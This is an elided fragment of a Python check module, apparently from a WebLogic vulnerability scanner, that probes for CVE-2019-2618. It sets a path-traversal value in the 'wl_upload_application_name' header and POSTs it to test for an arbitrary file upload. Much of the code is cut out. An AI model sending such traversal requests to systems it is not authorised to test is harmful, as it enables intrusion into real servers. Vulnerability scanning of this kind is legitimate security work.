# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-weblogicScanner\stars\cve_2019_2618.py
#!/usr/bin/env python3
...
class CVE_2019_2618(Star):
    info = {"NAME": "", "CVE": "CVE-2019-2618", "TAG": []}
...
"""
        ...
        headers["wl_upload_application_name"] = (
            "/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war"
        )
        unx_res, data = http(url, "POST", headers=headers, data=data, ssl=force_ssl)
        if (win_res != None and win_res.status_code != 404) or (
            unx_res != None and unx_res.status_code != 404
        ):
